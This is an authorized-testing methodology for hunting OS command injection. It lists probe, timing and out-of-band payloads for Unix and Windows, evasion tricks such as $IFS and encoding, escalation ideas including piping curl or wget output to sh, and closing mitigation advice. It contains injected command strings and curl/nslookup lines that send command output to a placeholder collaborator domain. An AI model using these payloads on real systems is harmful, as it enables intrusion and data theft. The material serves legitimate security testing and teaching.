### OS Command Injection Hunt Methodology

Use only with explicit authorization. This decision tree helps confirm command injection (reflected, blind, OOB), fingerprint the platform, and escalate impact safely.

---

## Decision tree: question-driven hunting

1) Where is user input executed server-side?
- Features commonly shelling out: ping/traceroute, image/video tools, PDF/ZIP utilities, backup/export, archivers, AI helpers calling CLI, system info pages.
- Identify input sinks: form fields, query params, headers (User-Agent, X-Forwarded-For), cookies, file names.

2) Initial probes (safe, reversible)
- Unix separators: `; id`, `| whoami`, `&& uname -a`.
- Windows separators: `& whoami`, `| ver`, `&& dir`.
- Observe: reflected output, error messages, or any side effects.

3) Blind detection
- Timing: `; sleep 5` (Unix), `& timeout /t 5` (Windows), or `ping -c 5 127.0.0.1` / `ping -n 5 127.0.0.1`.
- OOB: `nslookup x.{domain}` or `curl -s https://{domain}/p?d=$(whoami)` and watch collaborator.

4) Fingerprint platform and context
- OS: `whoami`, `uname -a` vs `ver`, `type C:\\Windows\\win.ini`.
- Privilege: `id`, `whoami /priv` (Windows via powershell/cmd).
- Shell/quoting: Does `$()`, backticks, or quotes work? Are spaces filtered (use `$IFS` or `{id,}`)?

5) Craft payloads per context
- Inline concatenation: separators from `Command Injections/wordlists/common-techniques.txt`.
- Subshells: `$(...)` / backticks; Windows: `powershell -c ...`.
- Redirection: capture to world-readable paths for later retrieval.
- Encoding/whitespace evasion: `%0a`, `%0d%0a`, `$IFS`, URL-encoding, double-encoding.

6) Confirm impact safely
- System info only first (`id; whoami; uname -a; pwd`).
- Avoid destructive commands. If demonstrating write, prefer temp paths.
- For OOB, exfil minimal identifiers only.

7) Scope for escalation (only if in-scope)
- Environment leverage: adjust `PATH`, leverage setuid binaries, sudo misconfigs.
- Data access: read config/keys; pivot to RCE via curl/wget + pipe to `sh` only if explicitly allowed.

---

## Quick payload mapping

- Reflected: `; id` → see output inline.
- Blind/time: `; sleep 5` (delay) or `ping -c 10 127.0.0.1`.
- OOB DNS/HTTP: `||nslookup x.{domain}||`, `; curl -s https://{domain}/p?d=$(whoami)`.
- Windows: `& whoami`, `& timeout /t 5`, `| type C:\\Windows\\win.ini`.
- No spaces: `$IFS-id`, `{id,}`.
- Subshell: `$(id)` or `` `id` ``.

---

## Reporting/mitigation

- Do not call shells; use safe library functions and parameterized APIs.
- Strict whitelisting/validation for any external command inputs.
- Drop privileges for the process; apply least privilege on files and network.
- Escape and validate arguments; avoid concatenation; use exec with argument arrays.
- Monitor and alert on anomalous child processes; restrict outbound egress.


